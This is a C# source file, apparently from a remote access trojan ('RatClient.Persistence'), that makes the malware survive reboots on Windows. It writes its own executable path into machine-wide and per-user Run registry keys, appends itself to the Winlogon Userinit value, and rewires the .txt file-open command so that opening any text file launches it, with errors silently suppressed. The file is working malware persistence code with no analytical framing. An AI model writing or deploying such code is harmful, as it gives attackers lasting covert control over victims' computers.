using Microsoft.Win32;
using System;



namespace RatClient.Persistence
{
    class Registrys
    {
        private static readonly string exec = $"\"{Info.CurrentexecutablePath}\"";
        private static readonly string localMachineRunPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private static readonly string logonUserRunPath = $@"{Info.UserInfo.userSid}\Software\Microsoft\Windows\CurrentVersion\Run";
        private static readonly string logonUserRunOncePath = $@"{Info.UserInfo.userSid}\Software\Microsoft\Windows\CurrentVersion\RunOnce";
        private static readonly string winlogonuserinitPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";

        public static bool RunLocalMachine(string name)
        {
            bool status = false;
            if (string.IsNullOrEmpty(name))
            {
                return status;
            }
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default))
            {
                using (RegistryKey sub = key.OpenSubKey(localMachineRunPath, true))
                {
                    if (sub != null)
                    {
                        sub.SetValue(name, exec, RegistryValueKind.String);
                        status = true;
                    }
                }
            }
            return status;
        }

        public static bool RunLogonUser(string name)
        {
            bool status = false;
            if (string.IsNullOrEmpty(name))
            {
                return status;
            }
            try
            {
                using (RegistryKey key = Registry.Users)
                {
                    using (RegistryKey sub = key.OpenSubKey(logonUserRunPath, true))
                    {
                        if (sub != null)
                        {
                            sub.SetValue(name, exec, RegistryValueKind.String);
                            status = true;
                        }
                    }
                }
            }
            catch { }
            return status;
        }

        public static bool WinLogonUserInit()
        {
            bool status = false;
            try
            {
                using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Default))
                {
                    using (RegistryKey sub = key.OpenSubKey(winlogonuserinitPath, true))
                    {
                        if (sub != null)
                        {
                            string currentvalue = (string)sub.GetValue("USERINIT");
                            if (currentvalue != null)
                            {
                                string value = $"{currentvalue.Split(',')[0].Trim()},{exec}";
                                sub.SetValue("USERINIT", value, RegistryValueKind.String);
                                status = true;
                            }
                        }
                    }
                }
            }
            catch { }
            return status;
        }

        public static bool PersistTxtfile()
        {
            if(RegTools.IsPersistTxtfile())
            {
                return true;
            }
            RegTools.RemoveUserChoice();
            bool status = false; 
            try
            {
                using (RegistryKey key = Registry.ClassesRoot.OpenSubKey("txtfile\\shell\\open\\command", true))
                {
                    if (key != null)
                    {
                        key.SetValue(null, $"{exec} -ptxt \"%1\"", RegistryValueKind.String);
                        status = true;
                    }
                }
            }
            catch { }
            return status;
        }
    }
}

